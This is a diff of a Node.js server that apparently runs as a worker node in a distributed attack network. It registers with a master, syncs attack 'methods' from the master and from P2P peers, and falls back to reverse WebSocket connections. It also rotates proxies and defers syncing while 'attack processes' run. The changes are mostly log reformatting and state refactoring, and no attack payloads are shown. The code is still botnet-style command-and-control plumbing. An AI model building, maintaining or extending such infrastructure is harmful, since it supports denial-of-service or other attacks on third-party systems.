-        '[REVERSE] ✗ WebSocket connection timeout, will retry in 10 seconds...'
-      );
+      console.log('[REVERSE] ✗ WebSocket connection timeout, will retry in 10 seconds...');
       setTimeout(
         () => startReverseMode(heartbeatInterval, methodsSyncInterval),
         10000
@@ -1480,80 +1203,51 @@ function startStandaloneMode() {
       const syncResult = await syncMethods();
       if (syncResult && syncResult.success) {
         console.log('[STANDALONE] ✓ Methods sync completed');
-        console.log(
-          `[STANDALONE] Methods count: ${Object.keys(
-            sharedData.methodsConfig
-          ).length}`
-        );
       }
 
       console.log('\n' + '='.repeat(80));
       console.log('[READY] Node ready in STANDALONE mode');
-      console.log(
-        `[READY] Methods: ${Object.keys(sharedData.methodsConfig).length}`
-      );
+      console.log(`[READY] Methods: ${Object.keys(sharedData.methodsConfig).length}`);
       console.log('='.repeat(80) + '\n');
     } catch (error) {
-      console.error(
-        '[STANDALONE] ✗ Sync error:',
-        error.message
-      );
+      console.error('[STANDALONE] ✗ Sync error:', error.message);
     }
   }, 2000);
 }
 
 function startHeartbeatService(heartbeatInterval) {
   if (heartbeatModule.startBackgroundHeartbeat) {
-    backgroundHeartbeat =
-      heartbeatModule.startBackgroundHeartbeat(heartbeatInterval);
+    backgroundHeartbeat = heartbeatModule.startBackgroundHeartbeat(heartbeatInterval);
     backgroundHeartbeat.start();
-    console.log(
-      `[HEARTBEAT] Background heartbeat started (every ${heartbeatInterval}ms)`
-    );
+    console.log(`[HEARTBEAT] Background heartbeat started (every ${heartbeatInterval}ms)`);
   } else {
     heartbeatIntervalId = setInterval(() => {
-      const isEncrypted =
-        encryptionManager && encryptionInitialized && config.ENCRYPTION?.ENABLED;
-
-      const sendFn = isEncrypted
-        ? heartbeatModule.sendEncryptedHeartbeat
-        : heartbeatModule.sendHeartbeat;
-
-      sendFn
-        .call(heartbeatModule)
+      heartbeatModule.sendHeartbeat()
         .catch((err) => console.error('[HEARTBEAT] Error:', err.message));
     }, heartbeatInterval);
-    console.log(
-      `[HEARTBEAT] Interval heartbeat started (every ${heartbeatInterval}ms)`
-    );
+    console.log(`[HEARTBEAT] Interval heartbeat started (every ${heartbeatInterval}ms)`);
   }
 }
 
-// Periodic sync setelah REGISTRASI
 function startPeriodicP2PSync(methodsSyncInterval) {
   if (!methodsSyncInterval || methodsSyncInterval <= 0) {
-    console.log(
-      '[PERIODIC-SYNC] Invalid interval, skipping periodic sync'
-    );
+    console.log('[PERIODIC-SYNC] Invalid interval, skipping periodic sync');
     return;
   }
 
   methodsSyncIntervalId = setInterval(async () => {
-    if (!isRegistered) {
+    if (!sharedData.isRegistered) {
       console.log('[PERIODIC-SYNC] Skipped - not registered');
       return;
     }
 
-    // ── ATTACK GUARD ────────────────────────────────────────────────────────
     if (isAttackInProgress()) {
       const activeCount = executor.getActiveProcessesCount();
       console.log(
-        `[PERIODIC-SYNC] ⚠ Skipped — ${activeCount} active attack process(es) running. ` +
-        `Sync deferred until attack completes.`
+        `[PERIODIC-SYNC] ⚠ Skipped — ${activeCount} active attack process(es) running.`
       );
       return;
     }
-    // ────────────────────────────────────────────────────────────────────────
 
     try {
       const syncResult = await syncMethods();
@@ -1568,9 +1262,8 @@ function startPeriodicP2PSync(methodsSyncInterval) {
       console.error('[PERIODIC-SYNC] Error:', error.message);
     }
   }, methodsSyncInterval);
-  console.log(
-    `[PERIODIC-SYNC] P2P-based periodic sync started (every ${methodsSyncInterval}ms)`
-  );
+
+  console.log(`[PERIODIC-SYNC] Periodic sync started (every ${methodsSyncInterval}ms)`);
 }
 
 async function retryRegistration(heartbeatInterval, methodsSyncInterval) {
@@ -1584,24 +1277,11 @@ async function retryRegistration(heartbeatInterval, methodsSyncInterval) {
   }
 
   try {
-    if (
-      typeof heartbeatModule !== 'object' ||
-      typeof heartbeatModule.autoRegister !== 'function'
-    ) {
-      console.error(
-        '[INIT] ✗ Heartbeat module is invalid for retry!',
-        typeof heartbeatModule
-      );
-      console.error(
-        '[INIT] Available keys:',
-        Object.keys(heartbeatModule || {})
-      );
+    if (typeof heartbeatModule !== 'object' || typeof heartbeatModule.autoRegister !== 'function') {
+      console.error('[INIT] ✗ Heartbeat module is invalid for retry!');
 
       if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
-        console.log(
-          '[INIT] Switching to REVERSE mode after validation failure'
-        );
-        nodeMode = 'REVERSE';
+        console.log('[INIT] Switching to REVERSE mode after validation failure');
         sharedData.setNodeMode('REVERSE');
         startReverseMode(heartbeatInterval, methodsSyncInterval);
       }
@@ -1611,10 +1291,7 @@ async function retryRegistration(heartbeatInterval, methodsSyncInterval) {
     const retryResult = await heartbeatModule.autoRegister();
 
     if (retryResult.success) {
-      console.log('='.repeat(80));
       console.log('[INIT] ✅ REGISTRATION SUCCESSFUL ON RETRY');
-      console.log('='.repeat(80));
-      isRegistered = true;
       sharedData.setRegistered(true);
 
       if (heartbeatIntervalId) clearInterval(heartbeatIntervalId);
@@ -1622,21 +1299,10 @@ async function retryRegistration(heartbeatInterval, methodsSyncInterval) {
 
       startDirectMode(heartbeatInterval, methodsSyncInterval);
     } else {
-      console.log('='.repeat(80));
-      console.log(
-        '[INIT] ✗ REGISTRATION RETRY FAILED:',
-        retryResult.error
-      );
-      console.log('='.repeat(80));
-      console.log(
-        '[INIT] Will retry again in 60 seconds...\n'
-      );
+      console.log('[INIT] ✗ REGISTRATION RETRY FAILED:', retryResult.error);
 
       if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
-        console.log(
-          '[INIT] Switching to REVERSE mode after multiple failures'
-        );
-        nodeMode = 'REVERSE';
+        console.log('[INIT] Switching to REVERSE mode after multiple failures');
         sharedData.setNodeMode('REVERSE');
         startReverseMode(heartbeatInterval, methodsSyncInterval);
       } else {
@@ -1648,13 +1314,9 @@ async function retryRegistration(heartbeatInterval, methodsSyncInterval) {
     }
   } catch (error) {
     console.error('[INIT] ✗ Error in retryRegistration:', error);
-    console.error('[INIT] Stack trace:', error.stack);
 
     if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
-      console.log(
-        '[INIT] Falling back to REVERSE mode after error...'
-      );
-      nodeMode = 'REVERSE';
+      console.log('[INIT] Falling back to REVERSE mode after error...');
       sharedData.setNodeMode('REVERSE');
       startReverseMode(heartbeatInterval, methodsSyncInterval);
     }
@@ -1689,20 +1351,14 @@ function gracefulShutdown(signal) {
     try {
       p2pNode.shutdown();
     } catch (e) {
-      console.error(
-        '[SHUTDOWN] Error shutting down P2P node:',
-        e.message
-      );
+      console.error('[SHUTDOWN] Error shutting down P2P node:', e.message);
     }
   }
   if (reverseClient?.shutdown) {
     try {
       reverseClient.shutdown();
     } catch (e) {
-      console.error(
-        '[SHUTDOWN] Error shutting down reverse client:',
-        e.message
-      );
+      console.error('[SHUTDOWN] Error shutting down reverse client:', e.message);
     }
   }
   if (executor?.cleanup) {
@@ -1737,20 +1393,14 @@ async function startServer() {
     console.log('='.repeat(80));
     console.log(`Port: ${config.SERVER.PORT}`);
     console.log(`Node ID: ${config.NODE.ID}`);
-    console.log(
-      `Encryption: ${
-        config.ENCRYPTION?.ENABLED ? 'ENABLED' : 'DISABLED'
-      }`
-    );
+    console.log(`Encryption: ${config.ENCRYPTION?.ENABLED ? 'ENABLED' : 'DISABLED'}`);
     console.log('='.repeat(80) + '\n');
 
     // Load initial methods config (local only)
     refreshMethodsConfig();
-    console.log(
-      `[INIT] Loaded ${Object.keys(sharedData.methodsConfig).length} methods (local)`
-    );
+    console.log(`[INIT] Loaded ${Object.keys(sharedData.methodsConfig).length} methods (local)`);
 
-    // Init P2P Hybrid Node (sebelum registrasi, tapi tidak sync dulu)
+    // Init P2P Hybrid Node (before registration)
     if (config.P2P?.ENABLED) {
       try {
         console.log('[P2P] Initializing P2P Hybrid Node...');
@@ -1761,6 +1411,9 @@ async function startServer() {
         );
         sharedData.setP2PNode(p2pNode);
 
+        // Init encryption first so P2P can use it
+        await initializeEncryption();
+
         if (encryptionManager) {
           p2pNode.setEncryptionManager(encryptionManager);
         }
@@ -1768,20 +1421,23 @@ async function startServer() {
         const p2pStarted = await p2pNode.startP2PServer(fastify);
         if (p2pStarted) {
           console.log('[P2P] ✓ P2P Hybrid Node started successfully');
-          
-          p2pNode.on('peer_message', (data) => {
-  const { nodeId, message } = data;
-  if (message.type === 'tunnel_delivery') {
-    console.log(`[TUNNEL] Received tunneled message from ${message.sourceNodeId} via ${message.relayNodeId}`);
-    // Process the tunneled payload as if it came directly
-    // The payload structure mirrors a normal P2P message
-    if (message.payload && message.messageType) {
-      p2pNode.emit(message.messageType, { nodeId: message.sourceNodeId, ...message.payload });
-    }
-  }
-});
 
-p2pNode.startReverseReconnect();
+          p2pNode.on('peer_message', (data) => {
+            const { nodeId, message } = data;
+            if (message.type === 'tunnel_delivery') {
+              console.log(
+                `[TUNNEL] Received tunneled message from ${message.sourceNodeId} via ${message.relayNodeId}`
+              );
+              if (message.payload && message.messageType) {
+                p2pNode.emit(message.messageType, {
+                  nodeId: message.sourceNodeId,
+                  ...message.payload
+                });
+              }
+            }
+          });
+
+          p2pNode.startReverseReconnect();
 
           p2pNode.on('peer_connected', (data) => {
             console.log(
@@ -1792,188 +1448,141 @@ p2pNode.startReverseReconnect();
           });
 
           p2pNode.on('peer_disconnected', (data) => {
-            console.log(
-              `[P2P-EVENT] Peer disconnected: ${data.nodeId}`
-            );
+            console.log(`[P2P-EVENT] Peer disconnected: ${data.nodeId}`);
           });
 
           p2pNode.on('peer_info', (data) => {
-            console.log(
-              `[P2P-EVENT] Peer info received from ${data.nodeId}`
-            );
+            console.log(`[P2P-EVENT] Peer info received from ${data.nodeId}`);
           });
 
-          // Methods updated from peer
-          p2pNode.on(
-            'methods_updated_from_peer',
-            async (data) => {
-              // ── ATTACK GUARD ─────────────────────────────────────────────
-              if (isAttackInProgress()) {
-                const activeCount = executor.getActiveProcessesCount();
-                console.log(
-                  `[P2P-EVENT] ⚠ Methods update from peer ${data.nodeId} deferred — ` +
-                  `${activeCount} active attack process(es) running.`
-                );
+          p2pNode.on('methods_updated_from_peer', async (data) => {
+            if (isAttackInProgress()) {
+              const activeCount = executor.getActiveProcessesCount();
+              console.log(
+                `[P2P-EVENT] ⚠ Methods update from peer ${data.nodeId} deferred — ` +
+                `${activeCount} active attack process(es) running.`
+              );
+              return;
+            }
+
+            console.log(
+              `[P2P-EVENT] Methods updated from peer ${data.nodeId}, saving and propagating...`
+            );
+
+            try {
+              const normalizedMethods = data.methods;
+
+              if (!normalizedMethods || Object.keys(normalizedMethods).length === 0) {
+                console.error('[P2P-EVENT] Received empty methods from peer, skipping');
                 return;
               }
-              // ─────────────────────────────────────────────────────────────
 
-              console.log(
-                `[P2P-EVENT] Methods updated from peer ${data.nodeId}, saving and propagating IMMEDIATELY...`
+              const methodsPath = config.SERVER.METHODS_PATH;
+              fs.writeFileSync(
+                methodsPath,
+                JSON.stringify(normalizedMethods, null, 2)
               );
+              console.log('[P2P-EVENT] ✓ Methods saved to local file');
 
-              try {
-                const normalizedMethods = data.methods;
+              refreshMethodsConfig();
+              console.log('[P2P-EVENT] ✓ Shared config updated');
 
-                if (
-                  !normalizedMethods ||
-                  Object.keys(normalizedMethods).length === 0
-                ) {
-                  console.error(
-                    '[P2P-EVENT] Received empty methods from peer, skipping'
-                  );
-                  return;
-                }
-
-                const methodsPath = config.SERVER.METHODS_PATH;
-                fs.writeFileSync(
-                  methodsPath,
-                  JSON.stringify(normalizedMethods, null, 2)
-                );
-                console.log('[P2P-EVENT] ✓ Methods saved to local file');
-
-                // Update shared config
-                refreshMethodsConfig();
-                console.log('[P2P-EVENT] ✓ Shared config updated');
-
-                // Notify master (fire-and-forget)
-                if (heartbeatModule?.updateMethodsVersion) {
-                  heartbeatModule
-                    .updateMethodsVersion()
-                    .then(() => {
-                      console.log(
-                        '[P2P-EVENT] ✓ Master notified of version update'
-                      );
-                    })
-                    .catch((error) => {
-                      console.error(
-                        '[P2P-EVENT] Failed to notify master:',
-                        error.message
-                      );
-                    });
-                }
-
-                // Propagate to other peers
-                if (p2pNode && p2pNode.peers.size > 0) {
-                  setImmediate(() => {
-                    const propagated =
-                      p2pNode.propagateMethodsUpdateImmediate(
-                        data.nodeId,
-                        data.methodsVersion
-                      );
-                    console.log(
-                      `[P2P-EVENT] ✓ Propagated to ${propagated} additional peer(s) with ZERO delay`
-                    );
+              if (heartbeatModule?.updateMethodsVersion) {
+                heartbeatModule
+                  .updateMethodsVersion()
+                  .then(() => {
+                    console.log('[P2P-EVENT] ✓ Master notified of version update');
+                  })
+                  .catch((error) => {
+                    console.error('[P2P-EVENT] Failed to notify master:', error.message);
                   });
-                }
-              } catch (error) {
-                console.error(
-                  '[P2P-EVENT] Failed to save/propagate methods:',
-                  error.message
-                );
               }
+
+              if (p2pNode && p2pNode.peers.size > 0) {
+                setImmediate(() => {
+                  const propagated = p2pNode.propagateMethodsUpdateImmediate(
+                    data.nodeId,
+                    data.methodsVersion
+                  );
+                  console.log(
+                    `[P2P-EVENT] ✓ Propagated to ${propagated} additional peer(s)`
+                  );
+                });
+              }
+            } catch (error) {
+              console.error('[P2P-EVENT] Failed to save/propagate methods:', error.message);
             }
-          );
+          });
         } else {
           console.log('[P2P] ✗ Failed to start P2P Hybrid Node');
         }
       } catch (error) {
-        console.error(
-          '[P2P] Error initializing P2P:',
-          error.message
-        );
+        console.error('[P2P] Error initializing P2P:', error.message);
       }
     } else {
       console.log('[P2P] P2P is disabled in config');
     }
 
-    // Initialize proxy updater (tidak auto-start sampai registrasi sukses)
+    // Initialize proxy updater
     if (config.PROXY?.AUTO_UPDATE) {
       try {
         proxyUpdater = createProxyUpdater(config);
         sharedData.setProxyUpdater(proxyUpdater);
-        console.log(
-          '[PROXY] Proxy updater initialized (will start after registration)'
-        );
+        console.log('[PROXY] Proxy updater initialized (will start after registration)');
       } catch (error) {
         console.error('[PROXY] Init error:', error.message);
       }
     }
 
-    // Initialize modules (encryption + heartbeat + test koneksi master)
+    // Initialize modules (encryption + heartbeat + test master connection)
+    // FIX: initializeEncryption may have been called above for P2P,
+    // but initializeModules handles it idempotently (checks encryptionInitialized)
     const masterReachable = await initializeModules();
 
     if (!masterReachable && config.MASTER?.URL) {
-      console.log(
-        '[INIT] WARNING: Cannot reach master, will try REVERSE mode if WS available'
-      );
+      console.log('[INIT] WARNING: Cannot reach master, will try REVERSE mode if WS available');
     }
 
     // Test encryption
     if (config.ENCRYPTION?.ENABLED && encryptionManager && encryptionInitialized) {
       try {
         const testResult = encryptionManager.testEncryption();
-        console.log(
-          `[ENCRYPTION-TEST] ${
-            testResult.success ? 'PASSED' : 'FAILED'
-          }`
-        );
+        console.log(`[ENCRYPTION-TEST] ${testResult.success ? 'PASSED' : 'FAILED'}`);
         if (!testResult.success && testResult.error) {
-          console.error(
-            `[ENCRYPTION-TEST] Error: ${testResult.error}`
-          );
+          console.error(`[ENCRYPTION-TEST] Error: ${testResult.error}`);
         }
       } catch (error) {
-        console.error(
-          '[ENCRYPTION-TEST] Error:',
-          error.message
-        );
+        console.error('[ENCRYPTION-TEST] Error:', error.message);
       }
     }
 
-    const heartbeatInterval =
-      config.MASTER?.HEARTBEAT_INTERVAL || 30000;
-    const methodsSyncInterval =
-      config.MASTER?.METHODS_SYNC_INTERVAL || 120000;
+    const heartbeatInterval = config.MASTER?.HEARTBEAT_INTERVAL || 30000;
+    const methodsSyncInterval = config.MASTER?.METHODS_SYNC_INTERVAL || 120000;
 
-    // Tentukan network mode (DIRECT / REVERSE)
+    // Determine network mode (DIRECT / REVERSE)
     const modeInfo = await determineNetworkMode();
-    nodeMode = modeInfo.mode;
-    sharedData.setNodeMode(nodeMode);
-    isReachable = modeInfo.reachable;
-    sharedData.setReachable(isReachable);
+    sharedData.setNodeMode(modeInfo.mode);
+    sharedData.setReachable(modeInfo.reachable);
 
     if (p2pNode) {
-      p2pNode.setNodeMode(nodeMode);
-      // setNodeMode() sudah otomatis set nodeReachable = (mode === 'DIRECT')
-      // tapi kita sync juga dengan hasil deteksi network
-      if (nodeMode === 'REVERSE') {
+      p2pNode.setNodeMode(sharedData.nodeMode);
+
+      if (sharedData.nodeMode === 'REVERSE') {
         p2pNode.nodeReachable = false;
-        console.log('[P2P] REVERSE mode aktif — node ini akan menerima koneksi P2P inbound saja');
-        console.log('[P2P] DIRECT peers yang discover node ini dari master akan connect ke kita');
+        console.log('[P2P] REVERSE mode — node akan menerima koneksi P2P inbound saja');
       } else {
-        p2pNode.nodeReachable = isReachable;
-        console.log(`[P2P] DIRECT mode aktif — node reachable: ${isReachable}`);
+        p2pNode.nodeReachable = sharedData.isReachable;
+        console.log(`[P2P] DIRECT mode — node reachable: ${sharedData.isReachable}`);
       }
     }
 
-    console.log(
-      `[INIT] Final mode: ${nodeMode}, Reachable: ${isReachable}`
-    );
+    console.log(`[INIT] Final mode: ${sharedData.nodeMode}, Reachable: ${sharedData.isReachable}`);
 
     startModeBasedOperations(heartbeatInterval, methodsSyncInterval);
 
-    await fetchServerInfo().catch(() => {});
+    // FIX: fetchServerInfo is informational only, always run after server starts
+    fetchServerInfo().catch(() => {});
+
   } catch (err) {
     console.error('Failed to start server:', err);
     process.exit(1);
@@ -1990,14 +1599,8 @@ process.on('uncaughtException', (error) => {
   gracefulShutdown('UNCAUGHT_EXCEPTION');
 });
 process.on('unhandledRejection', (reason, promise) => {
-  console.error(
-    '[FATAL] Unhandled Rejection at:',
-    promise,
-    'reason:',
-    reason
-  );
+  console.error('[FATAL] Unhandled Rejection at:', promise, 'reason:', reason);
   gracefulShutdown('UNHANDLED_REJECTION');
 });
 
-// Start the server
 startServer();
